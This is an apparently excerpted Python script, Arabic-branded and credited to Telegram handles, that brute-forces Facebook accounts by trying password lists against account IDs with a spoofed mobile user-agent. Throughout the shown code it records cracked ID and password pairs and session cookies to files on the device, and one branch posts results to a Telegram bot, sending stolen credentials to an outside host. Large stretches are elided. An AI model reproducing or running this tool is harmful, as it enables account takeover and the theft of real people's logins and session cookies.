...
print('\n\033[1;37mتثبيت الوحدات ...\n Iسوف يستغرق بعض الثواني ...')
import requests
...
if now >=target:print("حسن تاج  حسن تاج ﺪﻨﻋ ةﺍﺩﺍ ﻲﻓ كﺍﺮﺘﺷﻻﺍ ﻚﻨﻜﻤﻳ ةﺍﺩﺍ ﻒﻗﻮﺗ ﺪﻨﻋ مﺎﻀﻧ♕حسن تاج♕ ")
else:print("الملكه ةﺍﺩﺍ ﻲﻓ ﻚﺑ ﻦﻠﻫﺍ🤞🏻🔥 🌚")
def a(z):
        for e in z:
            sys.stdout.write(e)
            sys.stdout.flush()
...
if jkss ==toor:
 pas='toor'
 print('  ')
 print("\x1b[38;5;14m ﻢﺗ✓         ")
else:
 print('  ')
 print('\x1b[38;5;196m  هههههههههههه        ')
...
\x1b[1;36m{+} \x1b[1;33m𝙎pam   \x1b[1;33m: \x1b[1;33m حسن تاج
\x1b[1;36m{+} \x1b[1;35mحسن تاج V«1» 🤞🏻🔥  \x1b[1;35m: https://t.me/ABU_HARBA
...
def linex():
        print('\033[1;37mᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ حسن تاج ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ')
def clear():
        os.system('clear')
        print(('\033[92m—'*25)+'\n•. \n'+('—'*25))
        print(logo)
...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/حسن تاج.txt \033[0;97m\n')
        #100010138361148
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [\033[1;32mحسن تاج\033[1;37m] \033[1;37m[\033[1;32m%s\033[1;37m] \033[1;37m[\033[1;32mOK\033[1;37m/\033[1;91mCP\033[1;37m] \033[1;37m[\033[1;32m%s\033[1;37m\033[1;37m] \033[1;37m[\033[1;96m%s%%\033[1;37m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
	  ...
	  ᯓᯓᯓᯓᯓ حسن تاج ᯓᯓᯓᯓᯓ
	    • 𝙱𝚈 : @TTL9T - حسن تاج
				...
				'''
                                ...
                                open('/sdcard/حسن تاج-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/حسن تاج-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASX:
                                if 'y' in pcp:
                                        print(f'''DECODED BY @TTL9T
\r\033[1;91mCP✘	
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ حسن تاج ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ
•  𝙴𝙼𝙰𝙸𝙻     : {ids}
•  𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 : {pas}
...
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ	
	  ...
	  ᯓᯓᯓᯓᯓ حسن تاج ᯓᯓᯓᯓᯓ
	    • 𝙱𝚈 : حسن تاج - حسن تاج
				...
				'''
                                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                                        open('/sdcard/حسن تاج-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [حسن تاج] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
	  ...
	  ᯓᯓᯓᯓᯓ حسن تاج ᯓᯓᯓᯓᯓ
	    • 𝙱𝚈 : @TTL9T - حسن تاج
				...
				'''
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [حسن تاج-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/حسن تاج-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
...
def api1(ids,names,passlist):
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [حسن تاج-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/حسن تاج-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/حسن تاجCP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [حسن تاج-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/حسن تاج-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/حسن تاج_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [حسن تاج-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/حسن تاج-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
